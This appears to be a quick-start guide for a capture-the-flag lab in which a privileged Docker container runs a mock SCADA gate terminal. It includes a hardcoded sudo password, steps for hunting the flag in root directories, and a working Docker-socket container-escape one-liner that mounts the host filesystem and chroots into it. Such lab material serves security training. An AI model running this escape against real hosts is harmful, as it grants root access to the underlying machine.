# Quick Start Guide

## One-Command Setup

```bash
./setup.sh
```

This will:
1. Create the flag file on the host
2. Build the Docker image
3. Start the privileged container
4. Provide connection instructions

## Manual Setup

### 1. Create Flag File
```bash
# Flag is created inside the container during build
```

### 2. Build and Run
```bash
docker-compose up -d --build
```

### 3. Connect to SCADA Terminal
```bash
nc localhost 9001
```

### 4. Access Container Shell (for escape)
```bash
docker exec -it asylum_gate_control /bin/bash
```

## Challenge Flow

1. **Connect to SCADA terminal:** `nc localhost 9001`
2. **Explore the interface:** Use `help`, `status`, `info` commands
3. **Access container:** `docker exec -it asylum_gate_control /bin/bash`
4. **Find the flag in the container:** 
   - Use `sudo` with password `gatekeeper123` to access root directories
   - Explore hidden directories (try `/root/.asylum/`)
   - Use `find` or `grep` to search for files containing "THM{"
5. **Read the flag:** Once found, read the flag file
6. **Unlock the gate:** Connect to SCADA terminal and use `unlock /path/to/flag` or `unlock THM{...}`

## Useful Commands Inside Container

```bash
# Check mounts
mount | grep host

# Check Docker socket
ls -la /var/run/docker.sock

# Check capabilities
cat /proc/self/status | grep CapEff

# Use sudo to access root directory
sudo cat /root/.asylum/flag

# Use Docker socket to escape
docker -H unix:///var/run/docker.sock run -it --rm -v /:/host ubuntu chroot /host bash
```

## Verification

After setup, verify everything works:
```bash
# Check container is running
docker ps | grep asylum_gate_control

# Test SCADA connection
nc localhost 9001 << EOF
help
status
exit
EOF

# Verify flag exists in container
docker exec asylum_gate_control sudo cat /root/.asylum/flag
```
